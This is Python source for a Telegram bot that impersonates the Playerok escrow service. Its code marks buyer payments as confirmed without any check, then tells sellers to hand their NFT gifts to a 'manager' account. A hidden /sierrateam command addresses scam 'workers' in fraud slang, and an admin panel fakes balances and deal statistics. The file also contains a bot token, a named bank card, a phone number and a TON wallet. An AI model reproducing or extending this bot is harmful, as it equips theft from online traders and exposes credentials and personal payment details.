import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command, CommandStart

bot = Bot(token="8069883087:AAFLu1etTozXaNl-gqgDZG1rCMl7IKxeRwM")
dp = Dispatcher()

user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
ADMIN_ID = 8208815502
MANAGER_CARD = "2204 1201 3279 4013 - Maркин Ярослав"

def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/nft_playerok")],
    [InlineKeyboardButton(text="Наш сайт", url="https://playerok.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Telegram stars", callback_data="currency_🌟 Telegram Stars")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да,отменить", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 Посмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Continue", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", callback_data="support")],
    [InlineKeyboardButton(text="Our website", url="https://funpay.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Gift", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Telegram stars", callback_data="currency_🌟 Telegram Stars")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Yes,cancel", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Item sent", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Я ознакомился", callback_data="sierrateam_read")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⛔️ Забанить пользователя", callback_data="ban_user")],
    [InlineKeyboardButton(text="💸 Отправить деньги", callback_data="send_money")],
    [InlineKeyboardButton(text="✅ Установить успешные сделки", callback_data="set_successful_deals")],
    [InlineKeyboardButton(text="📊 Установить общее кол-во сделок", callback_data="set_total_deals")],
    [InlineKeyboardButton(text="💰 Установить оборот", callback_data="set_turnover")],
    [InlineKeyboardButton(text="🔙 Главное меню", callback_data="back_to_menu")]
])

banned_users = set()
admin_states = {}

bot_username = None

async def get_bot_username():
    global bot_username
    if bot_username is None:
        me = await bot.get_me()
        bot_username = me.username
    return bot_username

async def send_main_menu(chat_id, lang, message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    try:
        photo = "https://i.postimg.cc/8P1ySbyM/og-playerok.png"
        if lang == "ru":
            text = ("🛡️ Playerok Bot | OTC\n\n"
                    "Безопасный и удобный сервис для сделок!\n\n"
                    "Наши преимущества:\n"
                    "• Автоматические сделки\n"
                    "• Вывод в любой валюте\n"
                    "• Поддержка 24/7\n"
                    "• Удобный интерфейс\n\n"
                    "Выберите нужный раздел ниже:")
        else:
            text = ("🛡️ Playerok Bot | OTC\n\n"
                    "Safe and convenient service for deals!\n\n"
                    "Our advantages:\n"
                    "• Automatic deals\n"
                    "• Withdrawal in any currency\n"
                    "• 24/7 support\n"
                    "• User-friendly interface\n\n"
                    "Choose the desired section below:")
        
        if message_id:
            try:
                await bot.delete_message(chat_id, message_id)
            except:
                pass
        await bot.send_photo(chat_id, photo, caption=text, reply_markup=keyboard)
    except:
        if lang == "ru":
            text = ("🛡️ Playerok Bot | OTC\n\n"
                    "Безопасный и удобный сервис для сделок!\n\n"
                    "Наши преимущества:\n"
                    "• Автоматические сделки\n"
                    "• Вывод в любой валюте\n"
                    "• Поддержка 24/7\n"
                    "• Удобный интерфейс\n\n"
                    "Выберите нужный раздел ниже:")
        else:
            text = ("🛡️ Playerok Bot | OTC\n\n"
                    "Safe and convenient service for deals!\n\n"
                    "Our advantages:\n"
                    "• Automatic deals\n"
                    "• Withdrawal in any currency\n"
                    "• 24/7 support\n"
                    "• User-friendly interface\n\n"
                    "Choose the desired section below:")
        
        if message_id:
            try:
                await bot.delete_message(chat_id, message_id)
            except:
                pass
        await bot.send_message(chat_id, text, reply_markup=keyboard)

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup = None):
    try:
        await callback.message.edit_text(text, reply_markup=reply_markup)
    except:
        try:
            await callback.message.delete()
        except:
            pass
        await callback.message.answer(text, reply_markup=reply_markup)

async def handle_deal_join(message: Message, deal_id: str):
    if deal_id in active_deals:
        deal = active_deals[deal_id]
        buyer_id = message.from_user.id
        buyer_username = message.from_user.username or "Не указан"
        
        if deal["buyer_id"] is None:
            deal["buyer_id"] = buyer_id
            deal["buyer_username"] = buyer_username
            deal["status"] = "active"
            
            deal_type_ru = {"deal_gift": "Подарок", "deal_account": "Аккаунт", "deal_other": "Другое"}.get(deal["type"], "Другое")
            
            payment_text = ""
            if deal["currency"] == "RUB":
                payment_text = f"💳 Оплата производится переводом на карту менеджера:\n{MANAGER_CARD}\n\nПосле перевода нажмите кнопку «✅ Я оплатил»"
            else:
                payment_text = f"🏦 Способ оплаты: {deal['currency']}\n\nПосле оплаты нажмите кнопку «✅ Я оплатил»"
            
            await message.answer(
                f"💳 Информация о сделке #{deal_id}\n\n"
                f"👤 Вы покупатель в сделке.\n"
                f"📌 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n"
                f"• Успешные сделки: (0,)\n\n"
                f"• Вы покупаете: {deal['description']}\n"
                f"🎁 Тип: {deal_type_ru}\n\n"
                f"{payment_text}\n\n"
                f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}",
                reply_markup=buyer_deal_keyboard
            )
            
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            if seller_lang == "ru":
                deal_type_text = {"deal_gift": "gift", "deal_account": "account", "deal_other": "other"}.get(deal["type"], "other")
                await bot.send_message(
                    deal["seller_id"],
                    f"Пользователь @{buyer_username} ({buyer_id}) присоединился к сделке #{deal_id}\n"
                    f"• Успешные сделки: 0\n"
                    f"• Тип сделки: {deal_type_text}\n"
                    f"⚠️ Проверьте, что это тот же пользователь, с которым вы вели диалог ранее!"
                )
            else:
                deal_type_text = {"deal_gift": "gift", "deal_account": "account", "deal_other": "other"}.get(deal["type"], "other")
                await bot.send_message(
                    deal["seller_id"],
                    f"User @{buyer_username} ({buyer_id}) joined the deal #{deal_id}\n"
                    f"• Successful deals: 0\n"
                    f"• Deal type: {deal_type_text}\n"
                    f"⚠️ Make sure this is the same user you were chatting with before!"
                )
        else:
            await message.answer("❌ Эта сделка уже занята другим покупателем")
    else:
        await message.answer("❌ Сделка не найдена или была отменена")

@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте")
        return
    lang = user_languages.get(user_id, "ru")
    args = message.text.split()
    if len(args) > 1:
        param = args[1]
        if param.startswith('deal_'):
            deal_id = param.replace('deal_', '')
            await handle_deal_join(message, deal_id)
            return
    if user_id in user_agreements and user_agreements[user_id]:
        await send_main_menu(message.chat.id, lang)
    else:
        if lang == "ru":
            await message.answer(
                "Вы подтверждаете, что ознакомились и согласны с <<Условиями предоставления услуг Гарант сервиса?>>\n\n"
                "Подробнее: https://telegra.ph/Ispolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2",
                reply_markup=start_keyboard_ru
            )
        else:
            await message.answer(
                "Do you confirm that you have read and agree with the <<Terms of Service of the Guarantee Service?>>\n\n"
                "More details: https://telegra.ph/Ispolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2",
                reply_markup=start_keyboard_en
            )

@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
    
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "active":
            deal_id = did
            break
    
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "payment_confirmed"
        
        await callback.message.edit_text("✅ Оплата подтверждена ботом. Продавец уведомлен.")

        # Уведомляем админа просто для лога (по желанию можно убрать)
        await bot.send_message(ADMIN_ID, f"🧾 Покупатель @{callback.from_user.username} нажал 'Оплатил' в сделке #{deal_id}. Бот автоматически подтвердил.")

        seller_lang = user_languages.get(deal["seller_id"], "ru")
        if deal["type"] == "deal_gift":
            text_ru = (
                f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
                f"📜 Предмет: {deal['description']}\n\n"
                f"NFT ожидает отправки на официальный аккаунт менеджера - @NFT_Playerok\n\n"
                f"⚠️ Обратите внимание:\n"
                f"➤ Подарок необходимо передать именно менеджеру, а не покупателю напрямую.\n"
                f"➤ Это стандартный процесс для автоматического завершения сделки через бота.\n\n"
                f"После отправки средства будут зачислены на ваш счёт.\n\n"
                f"⚠️ Важно:\n"
                f"Проверяйте аккаунт перед тем как передать NFT, в случае передачи на фейк аккаунт мы не сможем вам компенсировать ущерб."
            )
            text_en = (
                f"✅ Payment confirmed for deal #{deal_id}\n\n"
                f"📜 Item: {deal['description']}\n\n"
                f"NFT must be sent to the official manager account — @NFT_Playerok\n\n"
                f"⚠️ Attention:\n"
                f"➤ The gift must be sent ONLY to the manager, not to the buyer.\n"
                f"➤ This is a standard process for automatic deal completion via the bot.\n\n"
                f"After sending, the funds will be credited to your balance.\n\n"
                f"⚠️ Important:\n"
                f"Please verify the account before sending the NFT. If you send it to a fake account, we cannot compensate your loss."
            )
            text = text_en if seller_lang == "en" else text_ru
            await bot.send_message(deal["seller_id"], text, reply_markup=seller_gift_keyboard)
        else:
            msg_ru = "✅ Оплата получена. Пожалуйста, передайте товар покупателю."
            msg_en = "✅ Payment received. Please send the item to the buyer."
            await bot.send_message(deal["seller_id"], msg_en if seller_lang == "en" else msg_ru, reply_markup=seller_gift_keyboard)

@dp.callback_query(F.data == "item_sent")
async def item_sent_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal["seller_id"] == callback.from_user.id and deal["status"] == "payment_confirmed":
            deal_id = did
            break
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "item_sent"
        await bot.send_message(deal["buyer_id"], "🔔 Продавец подтвердил передачу товара", reply_markup=buyer_confirmation_keyboard)
        await callback.message.edit_text("✅ Вы подтвердили отправку товара. Ожидаем подтверждения от покупателя.")

@dp.callback_query(F.data == "buyer_confirm_ok")
async def buyer_confirm_ok_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "item_sent":
            deal_id = did
            break
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "completed"
        success_message = "🎉 Сделка состоялась успешно!"
        await callback.message.edit_text(success_message)
        await bot.send_message(deal["seller_id"], success_message)
        del active_deals[deal_id]

@dp.callback_query(F.data == "buyer_confirm_fail")
async def buyer_confirm_fail_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте", show_alert=True)
        return
    deal_id = None
    for did, deal in active_deals.items():
        if deal["buyer_id"] == callback.from_user.id and deal["status"] == "item_sent":
            deal_id = did
            break
    if deal_id:
        await callback.message.edit_text("❌ Вы сообщили о проблеме с получением товара. Свяжитесь с поддержкой.")
        await bot.send_message(active_deals[deal_id]["seller_id"], "❌ Покупатель сообщил о проблеме с получением товара. Свяжитесь с поддержкой.")

@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    if message.from_user.id in banned_users: return
    await message.answer(
        "Прежде чем начать воркать через бота - прочитай правила:\n\n"
        "1. Наебал на нфт - ЕСЛИ ТЫ НАПИСАЛ МАМОНТУ КИНУТЬ ГИФТ ТЕБЕ А НЕ МЕНЕДЖЕРУ - БАН. (Если мамонт кинул нфт тебе сам, либо 40% в течении дня, либо кидаешь гифт на акк менеджеру, либо бан.\n\n"
        "2. Наебал на брейнрота - 40% от стоимости в течении дня, иначе бан\n\n"
        "3. Не прочитал правила - твои проблемы",
        reply_markup=sierrateam_keyboard
    )

@dp.callback_query(F.data == "sierrateam_read")
async def sierrateam_read_callback(callback: CallbackQuery):
    await safe_edit_message(callback, "👑 Админ-панель\n\nВыберите действие:\n\n🔓 Полный доступ: ❌ Отсутствует\n💼 Может подтверждать: Только подарки\n\n💎 Для получения полного доступа свяжитесь с @NFT_Playerok", reply_markup=admin_keyboard)

@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await safe_edit_message(callback, "Введите ID пользователя для блокировки:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    admin_states[callback.from_user.id] = "waiting_send_money"
    await safe_edit_message(callback, "Введите ID пользователя и сумму для перевода в формате: ID СУММА")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await safe_edit_message(callback, "Введите ID пользователя и количество успешных сделок в формате: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await safe_edit_message(callback, "Введите ID пользователя и общее количество сделок в формате: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    admin_states[callback.from_user.id] = "waiting_turnover"
    await safe_edit_message(callback, "Введите ID пользователя и оборот в формате: ID СУММА")

@dp.message(F.text)
async def handle_all_messages(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users: return

    if user_id == ADMIN_ID and user_id in admin_states:
        state, text = admin_states[user_id], message.text.strip()
        if state == "waiting_ban_id" and text.isdigit():
            banned_users.add(int(text)); await message.answer("✅ Забанен"); del admin_states[user_id]
        elif state == "waiting_send_money":
            parts = text.split()
            if len(parts) == 2:
                uid, amt = int(parts[0]), float(parts[1])
                user_balances[uid] = user_balances.get(uid, 0) + amt
                await message.answer(f"✅ Начислено {amt}"); del admin_states[user_id]
        elif state in ["waiting_successful_deals", "waiting_total_deals", "waiting_turnover"]:
            parts = text.split()
            if len(parts) == 2:
                uid, val = int(parts[0]), float(parts[1])
                if uid not in user_stats: user_stats[uid] = {"successful": 0, "total": 0, "turnover": 0}
                key = "successful" if "successful" in state else "total" if "total" in state else "turnover"
                user_stats[uid][key] = val
                await message.answer(f"✅ Обновлено {key}"); del admin_states[user_id]
        return

    if user_id in user_deals:
        deal_data = user_deals[user_id]
        lang = user_languages.get(user_id, "ru")
        if deal_data.get("step") == "description":
            deal_data["description"] = message.text
            deal_data["step"] = "currency"
            await message.answer("🛡 Создание сделки\n\nВыберите валюту:" if lang == "ru" else "🛡 Creating deal\n\nChoose currency:", reply_markup=currency_keyboard_ru if lang == "ru" else currency_keyboard_en)
        elif deal_data.get("step") == "amount":
            try:
                amt = float(message.text); deal_data["amount"] = amt; d_id = generate_deal_id(); uname = await get_bot_username()
                active_deals[d_id] = {"seller_id": user_id, "seller_username": message.from_user.username or "N/A", "description": deal_data["description"], "type": deal_data["type"], "currency": deal_data["currency"], "amount": amt, "buyer_id": None, "status": "created"}
                kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отменить сделку" if lang == "ru" else "❌ Cancel deal", callback_data=f"cancel_deal_{d_id}")]])
                await message.answer(f"✅ {'Сделка успешно создана' if lang == 'ru' else 'Deal successfully created'}!\n\n💰 {amt} {deal_data['currency']}\n📜 {deal_data['description']}\n🔗 https://t.me/{uname}?start=deal_{d_id}", reply_markup=kb)
                del user_deals[user_id]
            except: await message.answer("❌ Ошибка суммы")
        return

    text = message.text
    if " - " in text and any(c.isdigit() for c in text):
        user_requisites[user_id] = {"card": text}; await message.answer("✅ Реквизиты добавлены")
    elif len(text) > 30:
        if user_id not in user_requisites: user_requisites[user_id] = {}
        user_requisites[user_id]["ton"] = text; await message.answer("💎 ТОН добавлен")

@dp.callback_query(F.data == "agree")
async def agree_callback(callback: CallbackQuery):
    user_agreements[callback.from_user.id] = True
    lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, "Добро пожаловать в Playerok" if lang == "ru" else "Welcome to Playerok", welcome_keyboard_ru if lang == "ru" else welcome_keyboard_en)

@dp.callback_query(F.data == "continue")
async def continue_callback(callback: CallbackQuery):
    await send_main_menu(callback.message.chat.id, user_languages.get(callback.from_user.id, "ru"), callback.message.message_id)

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, "🛡 Создать сделку" if lang == "ru" else "🛡 Create deal", deal_type_keyboard_ru if lang == "ru" else deal_type_keyboard_en)

@dp.callback_query(F.data == "deal_gift")
async def deal_type_callback(callback: CallbackQuery):
    user_deals[callback.from_user.id] = {"type": callback.data, "step": "description"}
    lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, "🛡 Описание подарка" if lang == "ru" else "🛡 Gift description", back_keyboard_ru if lang == "ru" else back_keyboard_en)

@dp.callback_query(F.data.startswith("currency_"))
async def currency_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user_deals[user_id]["currency"] = callback.data.split("_")[1]
    user_deals[user_id]["step"] = "amount"
    lang = user_languages.get(user_id, "ru")
    await safe_edit_message(callback, f"Введите сумму в {user_deals[user_id]['currency']}", back_keyboard_ru if lang == "ru" else back_keyboard_en)

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    u_id = callback.from_user.id; balance = user_balances.get(u_id, 0); stats = user_stats.get(u_id, {"successful": 0, "total": 0, "turnover": 0})
    lang = user_languages.get(u_id, "ru")
    text = f"Профиль @{callback.from_user.username}\nБаланс: {balance} RUB\nСделок: {stats['total']}\nУспешно: {stats['successful']}\nОборот: {stats['turnover']}"
    await safe_edit_message(callback, text, profile_keyboard_ru if lang == "ru" else profile_keyboard_en)

@dp.callback_query(F.data == "deposit")
async def deposit_callback(callback: CallbackQuery):
    lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, "Как работает пополнение..." if lang == "ru" else "How deposit works...", read_keyboard_ru if lang == "ru" else read_keyboard_en)

@dp.callback_query(F.data == "read_deposit")
async def read_deposit_callback(callback: CallbackQuery):
    lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, "💳 Выберите способ" if lang == "ru" else "💳 Choose method", deposit_method_keyboard_ru if lang == "ru" else deposit_method_keyboard_en)

@dp.callback_query(F.data == "deposit_card")
async def deposit_card_callback(callback: CallbackQuery):
    memo = generate_memo(); lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, f"+79275173373 - Ярослав\nМемо: {memo}", back_simple_keyboard_ru if lang == "ru" else back_simple_keyboard_en)

@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton_callback(callback: CallbackQuery):
    memo = generate_memo(); lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, f"UQC8XYKyH-u5NPNGJEU_WFlqamxCqsai63_e9SuCLOH2m8_E\nМемо: {memo}", back_simple_keyboard_ru if lang == "ru" else back_simple_keyboard_en)

@dp.callback_query(F.data == "requisites")
async def requisites_callback(callback: CallbackQuery):
    lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, "💳 Реквизиты", requisites_keyboard_ru if lang == "ru" else requisites_keyboard_en)

@dp.callback_query(F.data == "view_requisites")
async def view_requisites_callback(callback: CallbackQuery):
    req = user_requisites.get(callback.from_user.id, {})
    txt = f"Ваши реквизиты:\n{req.get('card', 'Нет карты')}\n{req.get('ton', 'Нет ТОН')}"
    await safe_edit_message(callback, txt, back_simple_keyboard_ru)

@dp.callback_query(F.data == "change_language")
async def change_language_callback(callback: CallbackQuery):
    await safe_edit_message(callback, "🌍 Выберите язык:", language_keyboard)

@dp.callback_query(F.data == "lang_ru")
async def lang_ru_callback(callback: CallbackQuery):
    user_languages[callback.from_user.id] = "ru"; await send_main_menu(callback.message.chat.id, "ru", callback.message.message_id)

@dp.callback_query(F.data == "lang_en")
async def lang_en_callback(callback: CallbackQuery):
    user_languages[callback.from_user.id] = "en"; await send_main_menu(callback.message.chat.id, "en", callback.message.message_id)

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_callback(callback: CallbackQuery):
    await send_main_menu(callback.message.chat.id, user_languages.get(callback.from_user.id, "ru"), callback.message.message_id)

@dp.callback_query(F.data == "back_step")
async def back_step_callback(callback: CallbackQuery):
    await callback.answer()

@dp.callback_query(F.data == "back_to_requisites")
async def back_to_requisites_callback(callback: CallbackQuery):
    lang = user_languages.get(callback.from_user.id, "ru")
    await safe_edit_message(callback, "💳 Реквизиты", requisites_keyboard_ru if lang == "ru" else requisites_keyboard_en)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
